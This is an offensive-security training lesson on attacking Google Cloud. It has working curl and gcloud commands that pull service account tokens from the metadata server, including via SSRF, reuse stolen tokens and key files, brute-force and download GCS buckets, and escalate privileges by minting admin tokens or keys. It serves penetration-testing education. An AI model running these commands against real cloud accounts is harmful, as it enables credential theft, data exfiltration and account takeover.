---
title: "GCP for Attackers — Service Accounts, Metadata API, GCS Bucket Misconfiguration"
tags: [GCP, Google-Cloud, service-accounts, metadata-API, GCS, bucket-misconfiguration,
       workload-identity, IAM-binding, ATT&CK-T1552.005, ATT&CK-T1530,
       cloud-exploitation, gcloud]
module: 04-BroadSurface-02
day: 190
related_topics:
  - Cloud Threat Model (Day 181)
  - Azure for Attackers (Day 189)
  - Cloud Hardening (Day 195)
---

# Day 190 — GCP for Attackers

> "GCP is the smallest of the three major clouds in enterprise environments —
> but it is growing fast, especially in organisations that run Kubernetes on GKE
> or use BigQuery. The metadata service is the same idea: one SSRF, one token,
> one account. The storage misconfiguration is identical. The IAM model is
> different — bindings on resources, not policies on users. Learn the pattern
> once; apply it everywhere."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Explain GCP's IAM model: service accounts, IAM roles, and resource bindings.
2. Access the GCP Instance Metadata Server and extract service account tokens.
3. Use the `gcloud` CLI and GCP REST API with a stolen OAuth2 token.
4. Identify and exploit publicly accessible GCS buckets.
5. Enumerate GCP resources from a foothold with service account credentials.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Cloud threat model | Day 181 |
| Azure for Attackers (comparison) | Day 189 |
| HTTP and API concepts | Days 21–22 |

**Tools:**

```bash
# Google Cloud CLI
curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/\
google-cloud-cli-linux-x86_64.tar.gz
tar -xf google-cloud-cli-linux-x86_64.tar.gz
./google-cloud-sdk/install.sh
gcloud version
```

---

## Part 1 — GCP IAM Model

### 1.1 — Key Concepts

| Concept | GCP | AWS equivalent |
|---|---|---|
| IAM role | Predefined or custom role | IAM policy |
| IAM binding | Role + member assigned to a resource | Attach policy to principal |
| Service account | Non-human identity for resources | IAM role with instance profile |
| Workload Identity | Kubernetes pod auth without keys | IAM role for service account (IRSA) |
| Project | Billing and resource container | AWS Account |
| Organisation | Multi-project hierarchy | AWS Organisation |

**IAM binding format:**

```json
{
  "bindings": [
    {
      "role": "roles/storage.objectViewer",
      "members": [
        "serviceAccount:web-app@project.iam.gserviceaccount.com",
        "user:alice@company.com"
      ]
    }
  ]
}
```

### 1.2 — Dangerous GCP Roles

| Role | What it provides | Risk |
|---|---|---|
| `roles/owner` | Full control of project | Highest — same as AWS AdministratorAccess |
| `roles/editor` | Full resource modification, no IAM | High — can modify all resources |
| `roles/iam.serviceAccountAdmin` | Create/manage service accounts | High — escalation via new SA keys |
| `roles/iam.serviceAccountKeyAdmin` | Create SA keys | High — can generate credentials for any SA |
| `roles/iam.serviceAccountTokenCreator` | Generate tokens for any SA | Critical escalation |
| `roles/compute.admin` | Full VM management | High — SSRF + metadata via VM |
| `roles/storage.admin` | Full GCS access | High — all bucket data |

### 1.3 — Service Account Keys vs. Metadata Token

| Method | Security | Use case |
|---|---|---|
| SA key file (JSON) | Long-lived (no expiry unless rotated) | Legacy; high risk if leaked |
| Metadata token | Short-lived (1 hour) | Recommended for GCE/GKE/Cloud Run |
| Workload Identity | Federated; no key file | Kubernetes — best practice |

---

## Part 2 — GCP Metadata Server

### 2.1 — Metadata Endpoint

GCP metadata is at `http://metadata.google.internal/` (hostname) or
`http://169.254.169.254/` (IP):

```bash
# Instance identity
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/"

# Get the default service account OAuth2 token
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/\
service-accounts/default/token"
```

Response:
```json
{
  "access_token": "ya29.c.b0AXv0zTO...",
  "expires_in": 3598,
  "token_type": "Bearer"
}
```

### 2.2 — Useful Metadata Paths

| Path | Returns |
|---|---|
| `/instance/service-accounts/` | List of attached service accounts |
| `/instance/service-accounts/default/token` | OAuth2 access token |
| `/instance/service-accounts/default/email` | Service account email address |
| `/instance/service-accounts/default/scopes` | API scopes granted to this instance |
| `/project/project-id` | GCP project ID |
| `/instance/attributes/` | Custom instance attributes (often contain secrets) |
| `/instance/attributes/ssh-keys` | SSH public keys for the instance |

```bash
# Read custom instance attributes — often contain secrets
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/" \
  -o attr_list.txt

# For each attribute, read its value
for attr in $(cat attr_list.txt); do
  echo -n "$attr: "
  curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/attributes/$attr"
  echo
done
```

### 2.3 — SSRF to GCP Metadata

```bash
# SSRF: fetch GCP metadata via vulnerable URL-fetch endpoint
curl "http://vulnerable-app.example.com/fetch\
?url=http://metadata.google.internal/computeMetadata/v1/\
instance/service-accounts/default/token\
&Metadata-Flavor=Google"
```

**GCP SSRF-resistance feature:** The `Metadata-Flavor: Google` header is
required. Most SSRF vulnerabilities (URL-fetch) do not allow custom headers.
However, vulnerabilities in proxies, CRLF injection, or full SSRF with header
control bypass this protection.

---

## Part 3 — Using a Stolen GCP Token

### 3.1 — gcloud with Access Token

```bash
TOKEN="ya29.c.b0AXv0zTO..."

# Activate gcloud with the token
gcloud config set auth/token_file /dev/stdin <<< "{\"access_token\": \"$TOKEN\"}"
# Or use gcloud with the token directly via curl

# What identity is this?
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$TOKEN"

# List projects the identity can access
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"

# List GCS buckets
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID"

# List all GCE instances
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/\
aggregated/instances"
```

### 3.2 — gcloud with Service Account Key File

```bash
# Activate with a stolen JSON key file
gcloud auth activate-service-account \
  --key-file=stolen-key.json

# Who am I?
gcloud config get-value account

# Enumerate IAM bindings for the project
gcloud projects get-iam-policy PROJECT_ID --format=json \
  | jq '.bindings[] | select(.members[] | contains("serviceAccount")) \
  | {role: .role, accounts: .members}'

# List Cloud Functions
gcloud functions list

# List GCS buckets
gcloud storage ls
gcloud storage ls gs://bucket-name/

# List Cloud SQL instances
gcloud sql instances list

# List secrets in Secret Manager
gcloud secrets list
gcloud secrets versions access latest --secret="db-password"
```

---

## Part 4 — GCS Bucket Misconfiguration

### 4.1 — Discovering GCS Buckets

```bash
# Passive recon: look for storage.googleapis.com URLs
curl -s https://target-app.com | grep -oP '[a-z0-9_-]+\.storage\.googleapis\.com'

# Or direct bucket URLs
curl -s https://target-app.com | grep -oP 'storage\.googleapis\.com/[a-z0-9_-]+'

# Brute force bucket names (GCS uses global namespace)
for name in target-app target-app-prod target-app-backup target-app-data; do
  code=$(curl -so /dev/null -w '%{http_code}' \
    "https://storage.googleapis.com/$name/")
  echo "$name → $code"
  # 200 = public; 403 = exists but private; 404 = does not exist
done
```

### 4.2 — Exploiting Public Buckets

```bash
# List public bucket contents (no credentials needed)
curl -s "https://storage.googleapis.com/storage/v1/b/target-app-backup/o"
# → JSON with list of all objects

# Download an object (no credentials)
curl -o backup.tar.gz \
  "https://storage.googleapis.com/target-app-backup/backup-2024.tar.gz"

# Using gsutil without credentials
gsutil ls gs://target-app-backup/
gsutil cp gs://target-app-backup/backup-2024.tar.gz .
```

### 4.3 — IAM Bucket Bindings Check

```bash
# Check who has access to the bucket (requires storage.buckets.getIamPolicy)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/target-app-backup/iam" \
  | jq '.bindings[] | {role: .role, members: .members}'

# Dangerous: "allUsers" or "allAuthenticatedUsers" as a member
# allUsers        → public (unauthenticated) access
# allAuthenticatedUsers → any Google account (1.5B+ accounts)
```

---

## Part 5 — GCP Privilege Escalation Paths

### 5.1 — Via `iam.serviceAccountTokenCreator`

```bash
# If the SA has roles/iam.serviceAccountTokenCreator:
# Generate a token for any other SA in the project (including admin SA)
curl -s -H "Authorization: Bearer $YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  "https://iamcredentials.googleapis.com/v1/projects/-/\
serviceAccounts/admin@project.iam.gserviceaccount.com:generateAccessToken" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}'
# → Returns a token for the admin service account
```

### 5.2 — Via `iam.serviceAccountKeyAdmin`

```bash
# Create a new key for a high-privilege service account
curl -s -H "Authorization: Bearer $YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  "https://iam.googleapis.com/v1/projects/PROJECT_ID/\
serviceAccounts/admin@project.iam.gserviceaccount.com/keys" \
  | jq -r '.privateKeyData' | base64 -d > stolen-admin-key.json

# Activate and use
gcloud auth activate-service-account --key-file=stolen-admin-key.json
gcloud projects get-iam-policy PROJECT_ID
```

---

## Cloud Provider Comparison Summary

| Concept | AWS | Azure | GCP |
|---|---|---|---|
| Metadata IP | `169.254.169.254` | `169.254.169.254` | `169.254.169.254` / `metadata.google.internal` |
| Auth header | None (IMDSv1) / PUT token (IMDSv2) | `Metadata: true` | `Metadata-Flavor: Google` |
| Credential endpoint | `/latest/meta-data/iam/security-credentials/{role}` | `/metadata/identity/oauth2/token?resource=...` | `/computeMetadata/v1/instance/service-accounts/default/token` |
| Credential type | AWS SigV4 (AKIA/ASIA + session token) | OAuth2 Bearer token | OAuth2 Bearer token |
| Storage service | S3 | Azure Blob | GCS |
| CLI tool | `aws` | `az` | `gcloud` / `gsutil` |
| Enumeration framework | Pacu | ROADtools | GCPwn / ScoutSuite |

---

## Key Takeaways

1. **The metadata pattern is identical across all three clouds** — SSRF to
   `169.254.169.254`, required header differs. The output is a short-lived
   OAuth2 or SigV4 credential for the attached identity.
2. **GCS `allUsers` or `allAuthenticatedUsers` = public.** The latter grants
   access to any of the 1.5 billion Google accounts — effectively public for
   an attacker with any Google account.
3. **`iam.serviceAccountTokenCreator` is the GCP equivalent of AWS
   `iam:PassRole`.** It allows generating tokens for any service account —
   instant privilege escalation to any SA in the project.
4. **Custom instance attributes are a high-value secret store.** Developers
   routinely set database passwords, API keys, and configuration values in
   GCE instance attributes. They are readable from the metadata API inside
   the instance — and via SSRF from outside it.
5. **ScoutSuite and GCPwn provide multi-cloud enumeration.** Use them in
   larger engagements to quickly surface misconfigured IAM bindings, public
   storage, and exposed services across the project.

---

## Exercises

1. Set up a GCP free-tier project (or GCP SDK with Application Default
   Credentials on your local machine). Create a GCS bucket. Set one container
   as `allUsers: READER`. Verify it is publicly readable via `curl`. Then
   remove the binding and verify access is denied.
2. Simulate the metadata SSRF: write a Flask app with a `/fetch?url=` endpoint
   that fetches URLs server-side. Use it to fetch
   `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
   with and without the `Metadata-Flavor: Google` header. What happens each time?
3. Research: what is Google's VPC Service Controls feature? How does it prevent
   metadata token exfiltration from outside the VPC perimeter?
4. Write a ScoutSuite scan command for a GCP project. Identify which section
   of the report reveals: (a) public GCS buckets, (b) service accounts with
   the `editor` or `owner` role, (c) instances without OS Login enabled.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q190.1, Q190.2 …).
> Follow-up questions use hierarchical numbering (Q190.1.1, Q190.1.2 …).

---

## Navigation

← Previous: [Day 189 — Azure for Attackers](DAY-0189-Azure-for-Attackers.md)
→ Next: [Day 191 — Cloud Persistence Techniques](DAY-0191-Cloud-Persistence-Techniques.md)
